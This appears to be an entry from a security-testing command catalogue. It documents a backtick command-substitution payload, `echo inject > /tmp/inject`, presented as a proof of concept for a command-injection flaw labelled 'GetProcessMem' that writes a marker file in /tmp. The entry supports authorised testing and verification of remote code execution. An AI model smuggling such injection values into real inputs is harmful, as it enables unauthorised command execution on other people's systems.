---
id: 5a75d835-6a29-43ef-9362-88e619c4b8f6
name: ruby-echo-inject-tmp
type: command
executor: bash
data: '`echo inject > /tmp/inject`'
output: null
created_at: '2025-12-11T06:10:13.251Z'
updated_at: '2025-12-11T06:10:13.251Z'
platforms:
  - Linux
tags:
  - injection
  - file-write
verified: false
validated: true
submitted: true
---

# ruby-echo-inject-tmp

## Command

```bash
`echo inject > /tmp/inject`
```

## Description

Example injected command to write to /tmp via GetProcessMem vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|


## Examples

### Basic Usage

```bash
`echo inject > /tmp/inject`
```

## Expected Output

Creates /tmp/inject with 'inject'

## Related

- [[commands/ps-memory-injection]]
- [[procedures/Verify-Payload-Execution-and-RCE]]
